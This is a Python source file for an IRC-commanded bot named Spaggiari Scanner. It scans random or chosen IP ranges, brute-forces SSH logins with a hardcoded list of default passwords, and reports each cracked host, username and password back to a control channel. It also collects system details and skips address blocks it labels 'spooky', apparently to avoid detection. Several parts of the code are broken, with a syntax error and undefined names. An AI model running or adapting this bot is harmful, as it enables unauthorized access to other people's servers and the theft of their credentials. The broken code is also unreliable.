#!/usr/bin/env python
# Spaggiari Scanner
# Developed by acidvegas in Python 3
# https://github.com/acidvegas/spaggiari
# spaggiari_irc.py

'''
ISC License

Copyright (c) 2016, acidvegas (https://github.com/acidvegas/)

Permission to use, copy, modify, and/or distribute this software for any
purpose with or without fee is hereby granted, provided that the above
copyright notice and this permission notice appear in all copies.

THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR
ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN
ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
'''

'''
'sans armes, ni haine, ni violence'

Requirments:
 - Paramiko Library  (http://www.paramiko.org/)
 
Commands:
 - @info    <id/all>             | Information about the server.
 - @kill    <id/all>             | Kill the bot.
 - @random  <id/all>             | Scan random ip addresses.
 - @range   <id> <class> <range> | Scan a range of ip addresses.
 - @range   <id> <class> random  | Scan a random range of ip addresses.
 - @status  <id/all>             | Check the scanning status on the bot.
 - @stop    <id/all>             | Stop all current running scans.

Commands require either 'all' or the bots unique id after it.
If the bot has a nick of 'spag-tnnxu', the id of that bot is 'tnnxu'.
You can issue a command with '@info all', or '@info tnnxu'.
The <class> can be b or c. The <range> is the ip address range prefix to scan.

Examples:
    @range tnnxu b 192.168   (Scans the range 192.168.0.0-192.168.255.255)
    @range tnnxu c 192.168.1 (Scans the range 192.168.1.0-192.168.1.255)
    @range tnnxu b random    (Scans the range ?.?.0.0-?.?.255.255)
    @range tnnxu c random    (Scans the range ?.?.?.0-?.?./.255)
'''

import getpass
import os
import platform
import random
import re
import socket
import ssl
import sys
import threading
import time
import urllib.request
from collections import OrderedDict

# Connection
server     = 'irc.server.com'
port       = 6667
use_ipv6   = False
use_ssl    = False
password   = None
channel    = '#dev'
key        = None
admin_host = 'admin@admin.host'

# Throttle
max_threads     = 100
throttle        = 20
timeout_breaker = 5
timeout_port    = 1
timeout_ssh     = 10.0

# SSH Login Combos
combos = OrderedDict([
    ('root',  ('root','toor','admin','changeme','pass','password','1234','12345','123456')),
    ('admin', ('1234','12345','123456','4321','9999','abc123','admin','changeme','admin123','password'))
])

# Important Ranges
spooky   = ('11','21','22','24','25','26','29','49','50','55','62','64','128','129','130','131','132','134','136','137','138','139','140','143','144','146','147','148','150','152','153','155','156','157','158','159','161','162','163','164','167','168','169','194','195','199','203','204','205','207','208','209','212','213','216','217','6','7')
reserved = ('0','10','100.64','100.65','100.66','100.67','100.68','100.69','100.70','100.71','100.72','100.73','100.74','100.75','100.76','100.77','100.78','100.79','100.80','100.81','100.82','100.83','100.84','100.85','100.86','100.87','100.88','100.89','100.90','100.91','100.92','100.93','100.94','100.95','100.96','100.97','100.98','100.99','100.100','100.101','100.102','100.103','100.104','100.105','100.106','100.107','100.108','100.109','100.110','100.111','100.112','100.113','100.114','100.115','100.116','100.117','100.118','100.119','100.120','100.121','100.122','100.123','100.124','100.125','100.126','100.127','127','169.254','172.16','172.17','172.18','172.19','172.20','172.21','172.22','172.23','172.24','172.25','172.26','172.27','172.28','172.29','172.30','172.31','172.32','192.0.0','192.0.2','192.88.99','192.168','198.18','198.19','198.51.100','203.0.113','224','225','226','227','228','229','230','231','232','233','234','235','236','237','238','239','240','241','242','243','244','245','246','247','248','249','250','251','252','253','254','255')

# Formatting Control Characters / Color Codes
bold        = '\x02'
italic      = '\x1D'
underline   = '\x1F'
reverse     = '\x16'
reset       = '\x0f'
white       = '00'
black       = '01'
blue        = '02'
green       = '03'
red         = '04'
brown       = '05'
purple      = '06'
orange      = '07'
yellow      = '08'
light_green = '09'
cyan        = '10'
light_cyan  = '11'
light_blue  = '12'
pink        = '13'
grey        = '14'
light_grey  = '15'

# Debug Functions
def debug(msg):
    print('{0} | [~] - {1}'.format(get_time(), msg))

def error(msg, reason=None):
    if reason:
        print('{0} | [!] - {1} ({2})'.format(get_time(), msg, str(reason)))
    else:
        print('{0} | [!] - {1}'.format(get_time(), msg))

def error_exit(msg):
    raise SystemExit('{0} | [!] - {1}'.format(get_time(), msg))

def get_time():
    return time.strftime('%I:%M:%S')

def get_windows():
    if os.name == 'nt':
        return True
    else:
        return False



# Functions
def check_ip(ip):
    return re.match('^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$', ip)

def check_port(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout_port)
    try:
        code = sock.connect((ip, port))
    except socket.error:
        return False
    else:
        if not code:
            return True
        else:
            return False
    finally:
        sock.close()

def check_range(targets):
    found   = False
    for ip in targets:
        if found : break
        for bad_range in spooky + reserved:
            if ip.startswith(bad_range + '.'):
                found = True
                break
    return found

def color(msg, foreground, background=None):
    if background:
        return '\x03{0},{1}{2}{3}'.format(foreground, background, msg, reset)
    else:
        return '\x03{0}{1}{2}'.format(foreground, msg, reset)

def get_arch():
    return ' '.join(platform.architecture())

def get_dist():
    return ' '.join(platform.linux_distribution())

def get_home():
    return os.environ['HOME']

def get_hostname():
    return socket.gethostname()

def get_ip():
    try:
        source = urllib.request.urlopen('http://checkip.dyndns.com/')
        charset = source.headers.get_content_charset()
        if charset:
            source = source.read().decode(charset)
        else:
            source = source.read()
        return re.findall(r'[0-9]+(?:\.[0-9]+){3}', source)[0]
    except:
        return 'Unknown IP Address'

def get_kernel():
    return platform.release()

def get_username():
    return getpass.getuser()

def ip_range(start_ip, end_ip):
    start = list(map(int, start_ip.split('.')))
    end   = list(map(int, end_ip.split('.')))
    temp  = start
    ip_range = []
    ip_range.append(start_ip)
    while temp != end:
        start[3] += 1
        for i in (3, 2, 1):
           if temp[i] == 256:
              temp[i] = 0
              temp[i-1] += 1
        ip_range.append('.'.join(map(str, temp)))
    random.shuffle(ip_range)
    return ip_range

def random_ip():
    return '{0}.{1}.{2}.{3}'.format(random_int(1,223), random_int(0,255), random_int(0,255), random_int(0,255))

def random_int(min, max):
    return random.randint(min, max)

def random_str(size):
    return ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(size))



# Scan Functions
class random_scan(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
    def run(self):
        while True:
            if SpaggiariBot.stop_scan:
                break
            else:
                ip = (random_ip(),)
                if not check_range(ip):
                    ssh_bruteforce(ip).start()
            while threading.activeCount() >= max_threads:
                time.sleep(1)
                    
class range_scan(threading.Thread):
    def __init__(self, ip_range):
        self.ip_range = ip_range
        threading.Thread.__init__(self)
    def run(self):
        for ip in self.ip_range:
            if SpaggiariBot.stop_scan:
                break
            else:
                ssh_bruteforce(ip).start()
                self.ip_range.remove(ip)
                while threading.activeCount() >= max_threads:
                    time.sleep(1)
        while threading.activeCount() >= 2:
            time.sleep(1)
        SpaggiariBot.scanning = False
        SpaggiariBot.sendmsg(chan, '[{0}] - Scan has completed.'.format(color('#', blue)))

class ssh_bruteforce(threading.Thread):
    def __init__(self, ip):
        self.ip       = ip
        self.timeouts = 0
        threading.Thread.__init__(self)
    def run(self):
        if check_port(self.ip, 22):
            for username,password in combos:
                if SpaggiariBot.stop_scan or self.timeouts >= timeout_breaker:
                    break
                else:
                    if type(password) == tuple:
                        for item in password:
                            if SpaggiariBot.stop_scan or self.timeouts >= timeout_breaker:
                                break
                            else:
                                result = ssh_connect(self.ip, username, item)
                                if   result == 1 : self.timeouts += 1
                                elif result == 2 : self.timeouts = timeout_breaker
                                time.sleep(throttle)
                    else:
                        result = ssh_connect(self.host, username, password)
                        if   result == 1 : self.timeouts += 1
                        elif result == 2 : self.timeouts = timeout_breaker
                        time.sleep(throttle)

def ssh_connect(hostname, username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(hostname, 22, username, password, timeout=timeout_ssh)
    except socket.timeout:
        return 1
    except Exception as ex:
        return 0
    else:
        SpaggiariBot.sendmsg(channel, '[{0}] - Successful connection to {1} using {2}:{3}'.format(color('+', green), hostname, username, password))
        return 2
    finally:
        ssh.close()



# IRC Bot Object
class IRC(object):
    def __init__(self):
        self.server    = server
        self.port      = port
        self.use_ipv6  = use_ipv6
        self.use_ssl   = use_ssl
        self.password  = password
        self.channel   = channel
        self.key       = key
        self.nickname  = None
        self.id        = None
        self.scanning  = False
        self.stop_scan = False
        self.sock      = None

    def start(self):
        self.nickname = 'spag-' + random_str(5)
        if os.getuid() == 0 or os.geteuid() == 0:
            self.nickname = 'r' + self.nickname
        self.id = self.nickname[-5:]
        self.connect()

    def action(self, chan, msg):
        self.sendmsg(chan, '\x01ACTION {0}\x01'.format(msg))

    def connect(self):
        try:
            self.create_socket()
            self.sock.connect((self.server, self.port))
            if self.password:
                self.raw('PASS ' + self.password)
            self.raw('USER {0} 0 * :{1}'.format(self.username, self.realname))
            self.nick(self.nickname)
        except Exception as ex:
            error('Failed to connect to IRC server.', ex)
            self.event_disconnect()
        else:
            self.listen()

    def create_socket(self):
        if self.use_ipv6:
            self.sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
        else:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        if self.use_ssl:
            self.sock = ssl.wrap_socket(self.sock))

    def error(self, chan, msg, reason=None):
        if reason:
            self.sendmsg(chan, '[{0}] {1} {2}'.format(color('ERROR', red), msg, color('({0})'.format(str(reason)), grey)))
        else:
            self.sendmsg(chan, '[{0}] {1}'.format(color('ERROR', red), msg))

    def event_connect(self):
        self.join(self.channel, self.key)
        
    def event_disconnect(self):
        self.sock.close()
        self.stop_scan = True
        while threading.activeCount() >= 3:
            time.sleep(1)
        self.scanning  = False
        self.stop_scan = False
        time.sleep(10)
        self.connect()

    def event_kick(self, nick, chan, kicked, reason):
        if kicked == self.nickname and chan == self.channel:
            self.join(chan, self.key)
            
    def event_message(self, nick, host, chan, msg):
        if (not nick.startswith('spag-') or not nick.startswith('rspag-')) and host == admin_host:
            args = msg.split()
            cmd  = args[0].replace('@', '', 1)
            if len(args) == 2:
                if args[1] == 'all' or args[1] == self.id:
                    if cmd == 'info':
                        self.sendmsg(chan, '{0}@{1} ({2}) | {3} {4} | {5}'.format(get_username(), get_hostname(), get_ip(), get_dist(), get_arch(), get_kernel()))
                    elif cmd == 'kill':
                        self.stop_scan = True
                        self.scanning  = False
                        self.quit('KILLED')
                        sys.exit()
                    elif cmd == 'random':
                        if not self.scanning:
                            self.sendmsg(chan, '[{0}] - Scanning random IP addresses...'.format(color('#', blue)))
                            random_scan().start()
                        else:
                            self.error(chan, 'A scan is already running.')
                    elif cmd == 'status':
                        if self.scanning:
                            self.sendmsg(chan, 'Scanning: ' + color('True', green))
                        else:
                            self.sendmsg(chan, 'Scanning: ' + color('False', red))
                    elif cmd == 'stop':
                        if self.scanning:
                            self.stop_scan = True
                            while threading.activeCount() >= 2:
                                time.sleep(1)
                            self.action(chan, 'Stopped all running scans.')
                            self.scanning  = False
                            self.stop_scan = False
            elif len(args) == 4:
                if cmd == 'range' and args[1] == self.id:
                    if not self.scanning:
                        if args[2] in ('b','c'):
                            if args[2] == 'b':
                                if args[3] == 'random' : range_prefix = '{0}.{1}'.format(random_int(0,255), random_int(0,255))
                                else                   : range_prefix = args[3]
                                start = range_prefix + '.0.0'
                                end   = range_prefix + '.255.255'
                            elif args[2] == 'c':
                                if args[3] == 'random' : range_prefix = '{0}.{1}.{2}'.format(random_int(0,255), random_int(0,255), random_int(0,255))
                                else                   : range_prefix = args[3]
                                start = range_prefix + '.0'
                                end   = range_prefix + '.255'
                            if check_ip(start) and check_ip(end):
                                targets = ip_range(start, end)
                                if not check_range(targets):
                                    self.sendmsg(chan, '[{0}] - Scanning {1} IP addresses in range...'.format(color('#', blue), '{:,}'.format(len(targets))))
                                    self.scanning = True
                                    scan(targets).start()
                                else:
                                    self.error(chan, 'Spooky/Reserved IP address range.')
                            else:
                                self.error(chan, 'Invalid IP address range.')
                        else:
                            self.error(chan, 'Invalid arguments.')
                    else:
                        self.error(chan, 'A scan is already running.')
                        
    def event_nick_in_use(self):
        self.id       = random_str(5)
        self.nickname = self.nickname[:-5] + self.id
        self.nick(self.nickname)
            
    def handle_events(self, data):
        args = data.split()
        if args[0] == 'PING':
            self.raw('PONG ' + args[1][1:])
        elif args[1] == '001': # Use 002 or 003 if you run into issues.
            self.event_connect() 
        elif args[1] == '433':
            self.event_nick_in_use()
        if args[1] == 'KICK':
            nick   = args[0].split('!')[0][1:]
            chan   = args[2]
            kicked = args[3]
            self.event_kick(name, chan, kicked)
        elif args[1] == 'PRIVMSG':
            nick  = args[0].split('!')[0][1:]
            ident = args[0].split('!')[1]
            chan  = args[2]
            msg   = data.split('{0} PRIVMSG {1} :'.format(args[0], chan))[1]
            if chan != self.nickname:
                self.event_message(name, ident, chan, msg)

    def join(self, chan, key=None):
        if key:
            self.raw('JOIN {0} {1}'.format(chan, key))
        else:
            self.raw('JOIN ' + chan)

    def listen(self):
        while True:
            try:
                data = self.sock.recv(1024)
                for line in data.split(b'\r\n'):
                    if line:
                        try:
                            line = line.decode('utf-8')
                        except:
                            pass
                        debug(line)
                        if len(line.split()) >= 2:
                            self.handle_events(line)
                if b'Closing Link' in data and bytes(self.nickname, 'utf-8') in data:
                    break
            except Exception as ex:
                error('Unexpected error occured.', ex)
                break
        self.event_disconnect()

    def nick(self, nick):
        self.raw('NICK ' + nick)

    def quit(self, msg=None):
        if msg:
            self.raw('QUIT :' + msg)
        else:
            self.raw('QUIT')

    def raw(self, msg):
        self.sock.send(bytes(msg + '\r\n', 'utf-8'))

    def sendmsg(self, target, msg):
        self.raw('PRIVMSG {0} :{1}'.format(target, msg))

# Main
print(''.rjust(56, '#'))
print('#{0}#'.format(''.center(54)))
print('#{0}#'.format('Spaggiari Scanner'.center(54)))
print('#{0}#'.format('Developed by acidvegas in Python 3'.center(54)))
print('#{0}#'.format('https://github.com/acidvegas/spaggiari'.center(54)))
print('#{0}#'.format(''.center(54)))
print(''.rjust(56, '#'))
if not sys.version_info.major == 3:
    error_exit('Spaggiari Scanner requires Python version 3 to run!')
if get_windows():
    error_exit('Spaggiari Scanner must be ran on a Linux based OS!')
try:
    import paramiko
except ImportError:
    error_exit('Failed to import the Paramiko library!')
else:
    paramiko.util.log_to_file('/dev/null')
SpaggiariBot = IRC(server, port, use_ipv6, use_ssl, password, channel, key)
SpaggiariBot.start()
